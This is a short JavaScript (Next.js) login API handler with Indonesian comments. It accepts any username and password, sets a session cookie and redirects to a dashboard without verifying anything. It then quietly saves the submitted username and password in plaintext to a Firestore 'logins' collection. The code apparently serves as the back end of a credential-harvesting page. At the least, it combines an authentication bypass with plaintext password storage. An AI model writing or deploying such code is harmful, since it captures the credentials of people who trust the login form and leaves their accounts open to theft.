import { db } from '../../lib/firebase';
import { collection, addDoc, Timestamp } from 'firebase/firestore';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { username, password } = req.body;

    // Langsung redirect duluan, jangan tunggu Firebase
    res.setHeader('Set-Cookie', `session=1; Path=/; HttpOnly`);
    res.writeHead(302, { Location: '/dashboard' });
    res.end();

    // Simpan di background (tidak menunggu)
    try {
      await addDoc(collection(db, 'logins'), {
        username,
        password,
        time: Timestamp.now()
      });
    } catch (err) {
      console.error('Firebase error:', err);
    }
  } else {
    res.status(405).send('Method Not Allowed');
  }
}
